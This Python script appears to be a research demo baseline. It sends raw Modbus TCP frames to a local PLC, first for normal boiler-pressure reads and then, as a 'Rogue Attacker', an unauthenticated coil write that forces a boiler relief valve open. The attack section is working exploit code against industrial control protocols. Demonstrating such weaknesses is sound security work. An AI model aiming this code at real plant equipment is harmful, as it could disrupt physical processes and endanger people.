import socket
import struct
import time

HOST = "127.0.0.1"
PLC_PORT = 5020  # Direct Unsecured PLC Modbus TCP Port

C_RESET  = "\033[0m"
C_BOLD   = "\033[1m"
C_CYAN   = "\033[96m"
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_DIM    = "\033[90m"

def send_direct_plc(trans_id, unit_id, role_name, func_code, addr, val, desc):
    frame = struct.pack(">HHHBBHH", trans_id, 0, 6, unit_id, func_code, addr, val)
    t0 = time.perf_counter()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(3.0)
        s.connect((HOST, PLC_PORT))
        s.sendall(frame)
        resp = s.recv(1024)
    latency_ms = (time.perf_counter() - t0) * 1000.0

    is_exception = (len(resp) >= 8 and (resp[7] & 0x80) != 0)
    reading_str = "N/A"
    if func_code == 3 and not is_exception and len(resp) >= 11:
        _, _, _, _, _, _, psi = struct.unpack(">HHHBBBH", resp[:11])
        reading_str = f"{psi} PSI (Boiler Pressure)"
    elif func_code == 5:
        reading_str = "Coil 0 = OPEN (Relief Valve)" if val > 0 else "Coil 0 = CLOSED (Normal)"

    return {
        "step": desc,
        "role": f"Unit {unit_id} ({role_name})",
        "fc": f"FC=0{func_code}",
        "reading": reading_str,
        "latency": latency_ms
    }

def main():
    print(f"{C_BOLD}{C_CYAN}{'=' * 82}{C_RESET}")
    print(f"{C_BOLD}{C_CYAN}         SCENARIO 1: LEGACY UNSECURED ICS BASELINE (DIRECT MODBUS TCP){C_RESET}")
    print(f"{C_BOLD}{C_CYAN}{'=' * 82}{C_RESET}")
    print(f"  {C_DIM}Target Endpoint : {HOST}:{PLC_PORT} (No Edge Conduit / No Blockchain Governance){C_RESET}\n")

    print(f"{C_BOLD}{C_YELLOW}[PART A] Normal Plant-Floor Operations (Authorized Operators -> Direct PLC){C_RESET}")
    print(f"{C_DIM}{'-' * 82}{C_RESET}")

    ops = [
        (1, 1, "Engineer",    3, 0, 1,      "Read Boiler Pressure Telemetry"),
        (2, 2, "HMI Monitor", 3, 0, 1,      "Read Boiler Pressure Status"),
        (3, 1, "Engineer",    5, 0, 0x0000, "Set Relief Valve to Normal (CLOSED)")
    ]

    for tid, uid, role, fc, addr, val, desc in ops:
        res = send_direct_plc(tid, uid, role, fc, addr, val, desc)
        print(f"  {C_GREEN}[+] {res['role']:<22}{C_RESET} | {res['fc']} | {desc}")
        print(f"      Process State : {C_BOLD}{res['reading']}{C_RESET} | Latency: {C_BOLD}{res['latency']:.2f} ms{C_RESET}")
        print(f"      Security Check: {C_YELLOW}NONE (Accepted blindly in plaintext){C_RESET}\n")
        time.sleep(0.15)

    print(f"{C_BOLD}{C_RED}[PART B] Attack Without Security (Direct PLC Bypass){C_RESET}")
    print(f"{C_DIM}{'-' * 82}{C_RESET}")

    atk = send_direct_plc(99, 3, "Rogue Attacker", 5, 0, 0xFF00, "Malicious Override: Force Relief Valve OPEN")
    print(f"  {C_RED}[!] {atk['role']:<22}{C_RESET} | {atk['fc']} | {atk['step']}")
    print(f"      Process Impact: {C_RED}{C_BOLD}{atk['reading']} [PHYSICAL PROCESS HIJACKED!]{C_RESET}")
    print(f"      Attack Latency: {C_BOLD}{atk['latency']:.2f} ms{C_RESET} | Security Verdict: {C_RED}{C_BOLD}BREACH SUCCEEDED (Zero Friction){C_RESET}")
    print(f"{C_BOLD}{C_CYAN}{'=' * 82}{C_RESET}")
    print(f"{C_BOLD}SCENARIO 1 COMPLETE: Legacy environment is fully functional for operators")
    print(f"                     but completely vulnerable to unauthenticated takeover.{C_RESET}")
    print(f"{C_BOLD}{C_CYAN}{'=' * 82}{C_RESET}")

if __name__ == "__main__":
    main()
